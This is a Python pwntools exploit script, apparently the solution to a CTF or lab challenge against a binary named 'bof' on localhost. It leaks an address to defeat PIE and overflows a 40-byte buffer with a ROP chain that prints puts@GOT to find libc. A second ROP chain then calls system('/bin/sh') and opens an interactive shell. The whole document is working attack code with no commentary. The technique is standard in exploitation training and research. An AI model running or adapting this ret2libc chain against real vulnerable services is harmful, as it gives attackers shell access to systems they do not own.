from pwn import *

# r = process("./bof")
r = remote("localhost", 5014)
pause()

r.sendline("2")
r.sendline("17")
r.recvuntil("Value: ")
LEAK = int(r.recvline())
info(f"LEAK: {hex(LEAK)}")
BASE = LEAK - 0x630
info(f"BASE: {hex(BASE)}")

PUTS_GOT = BASE + 0x200fb8
PUTS_PLT = BASE + 0x5e0
POP_RDI_RET = BASE + 0x8b3
RET = BASE + 0x5c6
READ_ULL = BASE + 0x73a

r.sendline("2")

PAYLOAD = b"A" * 40
PAYLOAD += p64(POP_RDI_RET)
PAYLOAD += p64(PUTS_GOT)
PAYLOAD += p64(PUTS_PLT)
PAYLOAD += p64(READ_ULL)
r.sendline(PAYLOAD)

PUTS_OFFSET = 0x809c0

r.recvuntil(b"Choice: ")
PUTS_LIBC = u64(r.recvline()[:-1].ljust(8, b"\x00"))
info(f"PUTS@LIBC: {hex(PUTS_LIBC)}")
LIBC_BASE = PUTS_LIBC - PUTS_OFFSET
info(f"LIBC_BASE: {hex(LIBC_BASE)}")

SYSTEM_OFFSET = 0x4f440
BINSH_OFFSET = 0x1b3e9a
SYSTEM_LIBC = LIBC_BASE + SYSTEM_OFFSET
BINSH_LIBC = LIBC_BASE + BINSH_OFFSET

PAYLOAD = b"A" * 40
PAYLOAD += p64(RET)
PAYLOAD += p64(POP_RDI_RET)
PAYLOAD += p64(BINSH_LIBC)
PAYLOAD += p64(SYSTEM_LIBC)

r.sendline(PAYLOAD)

r.interactive()